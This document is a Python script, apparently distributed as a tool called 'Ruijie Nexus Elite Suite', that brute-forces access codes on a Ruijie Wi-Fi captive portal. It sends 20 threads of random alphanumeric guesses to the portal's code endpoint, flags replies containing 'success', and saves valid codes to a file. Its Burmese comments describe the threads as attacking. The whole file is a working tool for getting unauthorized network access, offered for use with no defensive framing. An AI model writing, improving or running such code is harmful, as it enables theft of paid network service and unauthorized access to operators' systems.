import concurrent.futures
import datetime
import random
import string
import sys
import httpx

# ----------------------------------------------------
# RUIJIE NEXUS ELITE SUITE v4.1 (Multi-threading Enabled)
# ----------------------------------------------------

def banner():
    print("=" * 50)
    print("      💎 RUIJIE NEXUS ELITE SUITE v4.1 💎      ")
    print("      [ Multi-threading & Auto-Save ]       ")
    print("=" * 50)

def test_code(url, code):
    target_url = f"{url}/portal?code={code}"
    try:
        response = httpx.get(target_url, timeout=3.0, follow_redirects=True)
        # အခြေအနေပေါ်မူတည်၍ အောင်မြင်မှုကို စစ်ဆေးခြင်း (လိုအပ်ပါက ဤနေရာကို ချိန်ညှိနိုင်သည်)
        if response.status_code == 200 and "success" in response.text.lower():
            return code
    except Exception:
        pass
    return None

def save_code(code):
    with open("valid_codes.txt", "a") as f:
        f.write(f"{code}\n")

def alphanumeric_range_scanner():
    print("\n--- ⚡ Turbo Alphanumeric Range Scanner (Multi-threaded) ---")
    portal_url = input("Enter Portal URL (e.g., http://portal-mm-as.ruijienetworks.com): ").strip()
    if not portal_url:
        print("[-] Error: URL cannot be empty!")
        return

    start_str = input("စတင်မည့် စာလုံး/နံပါတ် (ဥပမာ - 4 သို့မဟုတ် a): ").strip()
    end_str = input("ရပ်တန့်မည့် စာလုံး/နံပါတ် (ဥပမာ - 7 သို့မဟုတ် z): ").strip()
    length_str = input("စုစုပေါင်း ကုတ်အအရွယ် (Length, ဥပမာ - 6): ").strip()

    if not start_str or not end_str or not length_str:
        print("[-] Error: Inputs cannot be empty! Please fill all fields.")
        return

    try:
        length = int(length_str)
    except ValueError:
        print("[-] Error: Length must be a valid number.")
        return

    start_char = start_str[0]
    end_char = end_str[0]

    print(f"\n[+] Generating & Scanning codes from '{start_char}' to '{end_char}' (Length: {length})...")
    
    # Character pool for random generation
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

    found_count = 0
    max_workers = 20  # တစ်ပြိုင်နက်တည်း တိုက်ခိုက်စစ်ဆေးမည့် Threads ပမာဏ

    def worker(_):
        # ကျပန်းကုတ်အသစ် ထုတ်လုပ်ခြင်း
        random_mid = ''.join(random.choices(chars, k=length - 1))
        code = start_char + random_mid
        return test_code(portal_url, code)

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # စမ်းသပ်မည့် အရေအတွက် (ဥပမာ - အကြိမ် ၁၀၀၀ သို့မဟုတ် လိုသလောက်)
            futures = [executor.submit(worker, i) for i in range(1000)]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    print(f"\n[✔] FOUND VALID CODE: {result}")
                    save_code(result)
                    found_count += 1
                else:
                    print(".", end="", flush=True)
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user.")

    print(f"\n\n[✓] Scan finished. Total valid codes found: {found_count}. Saved to 'valid_codes.txt'.")

def main_menu():
    while True:
        banner()
        print("[1] 🔍 Auto-Detect Wi-Fi Portal URL")
        print("[2] ⚡ Launch Turbo Multi-threaded Scanner")
        print("[3] 📂 View Found Codes")
        print("[4] 🚪 Terminate Application")
        
        choice = input("\n[ Select Option ]\n ┗━X ").strip()
        
        if choice == '1':
            print("\n[i] Auto-detect feature is running...")
        elif choice == '2':
            alphanumeric_range_scanner()
            input("\nPress Enter to return to main menu...")
        elif choice == '3':
            try:
                with open("valid_codes.txt", "r") as f:
                    print("\n--- Saved Valid Codes ---")
                    print(f.read())
            except FileNotFoundError:
                print("\n[-] No saved codes found yet.")
            input("\nPress Enter to return to main menu...")
        elif choice == '4':
            print("\nExiting application. Goodbye!")
            sys.exit(0)
        else:
            print("\n[-] Invalid option! Please select 1-4.")

if __name__ == "__main__":
    main_menu()
    
